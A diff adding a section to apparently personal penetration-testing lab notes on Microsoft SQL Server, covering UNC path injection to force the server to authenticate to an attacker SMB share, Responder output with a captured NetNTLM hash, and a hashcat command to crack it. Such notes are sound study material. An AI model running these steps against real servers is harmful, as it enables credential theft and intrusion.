@@ -29,3 +29,23 @@ the datavase owner(dbo) account. If we perform a login with an account that has 
 account, it will automatically be mapped to the built-in guest user account.
 
 We can use SqlConnection class, [sqlconnect.cs](/13MSSQL/slqconnect.cs) to connect to the server. And run sql query.
+
+#### UNC Path injection
+
+We can force an SQL server with [forcesmb.cs](/13MSSQL/forcesmb.cs ) to connect to an SMB
+share we control, the connection will include authentication data. If the hostname is given as an IP address, Windows will automatically revert to NTLM
+authentication instead of Kerberos authentication.
+
+on the attack machine, we need to set up the responder to catch the relay.
+
+```
+kali@kali:~$ sudo responder -I tap0
+
+SQLSvc::corp1:00031db3ed40602b:A05501E7450025CF27120CE89BAF1C6E:0101000000000000C06531
+50DE09D201F361A5C346497213000000000200080053004D004200330001001E00570049004E002D005000
+.....
+```
+We can crack the NetNTLM hash with hashcat
+```
+kali@kali:~$ hashcat -m 5600 hash.txt dict.txt --force
+```
